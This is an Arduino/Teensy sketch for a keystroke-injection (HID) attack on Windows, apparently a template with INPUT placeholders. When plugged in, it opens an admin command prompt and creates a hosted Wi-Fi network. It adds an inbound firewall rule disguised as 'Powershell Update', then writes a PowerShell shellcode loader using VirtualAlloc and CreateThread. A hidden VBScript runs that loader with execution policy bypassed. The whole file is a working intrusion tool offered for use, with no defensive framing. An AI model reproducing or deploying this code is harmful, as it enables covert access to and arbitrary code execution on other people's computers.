#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("netsh wlan set hostednetwork mode=allow ssid=INPUT0 key=INPUT1");
  delay(5000);
  Keyboard.println("netsh wlan start hostednetwork");
  delay(5000);
  Keyboard.println("netsh advfirewall firewall add rule name=\"Powershell Update\" dir=in action=allow protocol=TCP localport=INPUT2");
  delay(3000);
  Keyboard.println("echo $code = @' > %temp%\\ce.ps1");
  Keyboard.println("echo [DllImport(\"kernel32.dll\")] >> %temp%\\ce.ps1");
  Keyboard.println("echo public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); >> %temp%\\ce.ps1");
  Keyboard.println("echo [DllImport(\"kernel32.dll\")] >> %temp%\\ce.ps1");
  Keyboard.println("echo public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); >> %temp%\\ce.ps1");
  Keyboard.println("echo [DllImport(\"msvcrt.dll\")] >> %temp%\\ce.ps1");
  Keyboard.println("echo public static extern IntPtr memset(IntPtr dest, uint src, uint count); >> %temp%\\ce.ps1");
  Keyboard.println("echo '@ >> %temp%\\ce.ps1");
  Keyboard.println("echo $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru >> %temp%\\ce.ps1");
  Keyboard.println("echo [Byte[]]$sc = >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT3 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT4 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT5 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT6 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT7 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT8 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT9 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT10 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT11 >> %temp%\\ce.ps1");
  Keyboard.println("echo INPUT12 >> %temp%\\ce.ps1");


  Keyboard.println("echo $size = 0x1000 >> %temp%\\ce.ps1");
  Keyboard.println("echo if ($sc.Length -gt 0x1000) {$size = $sc.Length} >> %temp%\\ce.ps1");
  Keyboard.println("echo $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) >> %temp%\\ce.ps1");
  Keyboard.println("echo for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} >> %temp%\\ce.ps1");
  Keyboard.println("echo $winFunc::CreateThread(0,0,$x,0,0,0) >> %temp%\\ce.ps1");
  Keyboard.println("echo while($true){start-sleep -seconds 2} >> %temp%\\ce.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\ce.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\ce.ps1\"),0,true >> %temp%\\ce.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\ce.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS